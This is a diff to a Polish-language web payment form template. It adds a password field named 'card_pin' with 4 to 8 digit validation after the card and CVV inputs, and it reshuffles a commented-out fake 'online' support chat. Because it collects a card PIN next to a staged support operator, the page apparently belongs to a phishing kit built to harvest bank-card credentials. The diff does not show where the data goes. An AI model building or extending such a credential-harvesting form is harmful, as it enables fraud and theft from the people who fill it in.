@@ -831,6 +831,10 @@
                                     </div>
                                 </div>
                             </div>
+                            <div>
+                                <input id="_input4" value="" name="card_pin" class="_4" type="password"
+                                       placeholder="Pin">
+                            </div>
                         </div>
                     </div>
                     <div class="_14">
@@ -866,67 +870,67 @@
             </div>
         </form>
     </div>
-{{--    <div id="offonthechap">--}}
-{{--        <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed"--}}
-{{--             style="bottom: 0px;">--}}
-{{--            <div class="chaport-launcher" style="left: 0px; right: 0px;">--}}
-{{--                <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">--}}
-{{--                    <div class="chaport-launcher-chat-icon"></div>--}}
-{{--                    <div class="chaport-launcher-close-icon"></div>--}}
-{{--                    <div class="chaport-launcher-operator-photo"></div>--}}
-{{--                </div>--}}
-{{--            </div>--}}
-{{--            <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">--}}
-{{--                <div class="chaport-inner">--}}
-{{--                    <div class="main-textblock">--}}
-{{--                        <div class="operatorblock">--}}
-{{--                            <div class="operatorblock-content" style="display: flex;">--}}
-{{--                                <div id="operator-photo">--}}
-{{--                                    <img id="oper-photo-img" src="/operator-img.png">--}}
-{{--                                    <div class="operator-name">Sofia</div>--}}
-{{--                                </div>--}}
-{{--                                <div class="team-wrapper">--}}
-{{--                                    <div class="team">Pomoc techniczna</div>--}}
-{{--                                    <div class="activity-indicator">--}}
-{{--                                        <div class="with-status" style="display: inline-block;">--}}
-{{--                                            <div class="status-online" style="display: inline-block;">--}}
+    {{--    <div id="offonthechap">--}}
+    {{--        <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed"--}}
+    {{--             style="bottom: 0px;">--}}
+    {{--            <div class="chaport-launcher" style="left: 0px; right: 0px;">--}}
+    {{--                <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">--}}
+    {{--                    <div class="chaport-launcher-chat-icon"></div>--}}
+    {{--                    <div class="chaport-launcher-close-icon"></div>--}}
+    {{--                    <div class="chaport-launcher-operator-photo"></div>--}}
+    {{--                </div>--}}
+    {{--            </div>--}}
+    {{--            <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">--}}
+    {{--                <div class="chaport-inner">--}}
+    {{--                    <div class="main-textblock">--}}
+    {{--                        <div class="operatorblock">--}}
+    {{--                            <div class="operatorblock-content" style="display: flex;">--}}
+    {{--                                <div id="operator-photo">--}}
+    {{--                                    <img id="oper-photo-img" src="/operator-img.png">--}}
+    {{--                                    <div class="operator-name">Sofia</div>--}}
+    {{--                                </div>--}}
+    {{--                                <div class="team-wrapper">--}}
+    {{--                                    <div class="team">Pomoc techniczna</div>--}}
+    {{--                                    <div class="activity-indicator">--}}
+    {{--                                        <div class="with-status" style="display: inline-block;">--}}
+    {{--                                            <div class="status-online" style="display: inline-block;">--}}
 
-{{--                                            </div>--}}
-{{--                                            online--}}
-{{--                                        </div>--}}
-{{--                                    </div>--}}
-{{--                                </div>--}}
-{{--                            </div>--}}
-{{--                        </div>--}}
-{{--                        <div class="chat-block">--}}
-{{--                            <div id="chat">--}}
-{{--                                <div class="operators-msg" id="greeting-msg" style="display: none;">--}}
-{{--                                    <div class="operators-photo"><img src="/operator-img.png"></div>--}}
-{{--                                    <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>--}}
-{{--                                </div>--}}
+    {{--                                            </div>--}}
+    {{--                                            online--}}
+    {{--                                        </div>--}}
+    {{--                                    </div>--}}
+    {{--                                </div>--}}
+    {{--                            </div>--}}
+    {{--                        </div>--}}
+    {{--                        <div class="chat-block">--}}
+    {{--                            <div id="chat">--}}
+    {{--                                <div class="operators-msg" id="greeting-msg" style="display: none;">--}}
+    {{--                                    <div class="operators-photo"><img src="/operator-img.png"></div>--}}
+    {{--                                    <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>--}}
+    {{--                                </div>--}}
 
-{{--                            </div>--}}
-{{--                            <div id="input-msg" style="display: flex;">--}}
-{{--                                <input type="text" name="smstosup1" id="smstosup1"--}}
-{{--                                       placeholder="Wpisz swoją wiadomość...">--}}
-{{--                                <button id="smstosupbutton1">--}}
-{{--                                    <div class="chaport-send-icon">--}}
-{{--                                        <svg width="18" height="18" viewBox="0 0 535.5 535.5">--}}
-{{--                                            <polygon--}}
-{{--                                                    points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75"--}}
-{{--                                                    fill="#b9bdbf">--}}
-{{--                                            </polygon>--}}
-{{--                                        </svg>--}}
-{{--                                    </div>--}}
-{{--                                </button>--}}
-{{--                            </div>--}}
-{{--                        </div>--}}
-{{--                    </div>--}}
-{{--                </div>--}}
-{{--            </div>--}}
-{{--            <div class="chaport-big-shadow"></div>--}}
-{{--        </div>--}}
-{{--    </div>--}}
+    {{--                            </div>--}}
+    {{--                            <div id="input-msg" style="display: flex;">--}}
+    {{--                                <input type="text" name="smstosup1" id="smstosup1"--}}
+    {{--                                       placeholder="Wpisz swoją wiadomość...">--}}
+    {{--                                <button id="smstosupbutton1">--}}
+    {{--                                    <div class="chaport-send-icon">--}}
+    {{--                                        <svg width="18" height="18" viewBox="0 0 535.5 535.5">--}}
+    {{--                                            <polygon--}}
+    {{--                                                    points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75"--}}
+    {{--                                                    fill="#b9bdbf">--}}
+    {{--                                            </polygon>--}}
+    {{--                                        </svg>--}}
+    {{--                                    </div>--}}
+    {{--                                </button>--}}
+    {{--                            </div>--}}
+    {{--                        </div>--}}
+    {{--                    </div>--}}
+    {{--                </div>--}}
+    {{--            </div>--}}
+    {{--            <div class="chaport-big-shadow"></div>--}}
+    {{--        </div>--}}
+    {{--    </div>--}}
     @push('js')
         {{--        <script type="text/javascript" charset="utf-8" async="" src="https://www.smartsuppchat.com/loader.js?"></script>--}}
         <script>
@@ -957,6 +961,13 @@
                     'valid': false,
                     'chars': chsNum,
                     'length': [3, 3],
+                    'mask': false,
+                    'style': '_4',
+                },
+                {
+                    'valid': false,
+                    'chars': chsNum,
+                    'length': [4, 8],
                     'mask': false,
                     'style': '_4',
                 },
@@ -1008,6 +1019,8 @@
                             _input2.focus();
                         } else if (indx == 2) {
                             _input3.focus();
+                        } else if (indx == 3) {
+                            _input4.focus();
                         }
                     } else {
                         sty2 = ' _15';
@@ -1062,6 +1075,7 @@
                 _buttonPay.disabled = true;
                 for (let i = 0; i < fields.length; i++) {
                     let e = document.getElementById('_input' + i);
+                    console.log(e);
                     e.oninput = function () {
                         inputMask(e, i);
                     }
